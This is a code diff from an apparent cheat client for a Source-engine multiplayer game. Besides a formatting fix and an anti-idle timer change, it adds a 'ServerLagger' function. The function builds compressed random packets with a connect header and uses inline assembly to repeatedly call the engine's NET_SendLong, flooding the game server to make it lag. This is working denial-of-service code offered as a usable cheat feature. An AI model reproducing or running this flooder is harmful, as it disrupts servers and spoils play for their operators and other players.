@@ -358,7 +358,7 @@ namespace Features
 			if (!I::EngineClient->GetPlayerInfo(voterIndex, &info))
 				return;
 
-			::Log::PrefixedMsg( "%s voted %s\n", info.name, (option ? "NO" : "YES"));
+			::Log::PrefixedMsg("%s voted %s\n", info.name, (option ? "NO" : "YES"));
 		}
 
 		void CmdSpam(const std::chrono::high_resolution_clock::time_point& curTime)
@@ -513,11 +513,82 @@ namespace Features
 			}
 
 			const auto passed = std::chrono::duration_cast<std::chrono::seconds>(curTime - lastMovedTime).count();
-			if (30 <= passed)
+			if (60 <= passed)
 			{
 				cmd->buttons = IN_FORWARD;
 				lastMovedTime = curTime;
 			}
+		}
+
+		// Credits: Harpoon
+		// https://github.com/sieyconhay1001/Harpoon/blob/master/Harpoon/EngineHooks.cpp#L2135
+		void ServerLagger()
+		{
+			static int lagCounter = 0;
+
+			float flLagTime = Settings::Misc::ServerLagger::LagTime.GetFloat();
+			float flRestTime = Settings::Misc::ServerLagger::RestTime.GetFloat();
+			if (0.f < flLagTime && 0.f < flRestTime)
+			{
+				int lagLimit = TIME_TO_TICKS(flLagTime);
+				if (lagLimit < lagCounter)
+				{
+					static int restCounter = 0;
+					int restLimit = TIME_TO_TICKS(flRestTime);
+					if (restLimit < restCounter)
+					{
+						lagCounter = 0;
+						restCounter = 0;
+					}
+					else
+					{
+						++restCounter;
+						return;
+					}
+				}
+			}
+
+			INetChannel* nc = I::EngineClient->GetNetChannelInfo();
+			if (!nc)
+				return;
+
+			static BYTE compressedRandom[MAX_ROUTABLE_PAYLOAD * 10] = { 0 };
+			if (!compressedRandom[0])
+			{
+				BYTE random[sizeof(compressedRandom)] = { 0 };
+				// randomize every second byte so compressor can compress
+				for (UINT i = 0; i < sizeof(random); i += 2)
+					random[i] = (BYTE)rand();
+
+				CLZSS compressor;
+				UINT compressedSize;
+				if (!compressor.CompressNoAlloc(random, sizeof(random), compressedRandom, &compressedSize))
+					return;
+
+				// bf_write doesn't copy but uses provided buffer
+				bf_write buf(compressedRandom, sizeof(compressedRandom));
+				buf.WriteLong(CONNECTIONLESS_HEADER);
+				buf.WriteByte(C2S_CONNECT);
+				buf.WriteLong(I::EngineClient->GetEngineBuildNumber());
+			}
+
+			const UINT sendCount = Settings::Misc::ServerLagger::Strength.GetInt() * 45;
+
+			for (UINT i = 0; i < sendCount; ++i)
+			{
+				BYTE* pCompressedRandom = compressedRandom;
+				int len = (sizeof(SPLITPACKET) + 1);
+				_asm {
+					mov ecx, nc
+					mov edx, pCompressedRandom
+					push MIN_USER_MAXROUTABLE_SIZE
+					push len
+					call Signatures::NET_SendLong
+					add esp, 8
+				}
+			}
+
+			++lagCounter;
 		}
 	}
 }
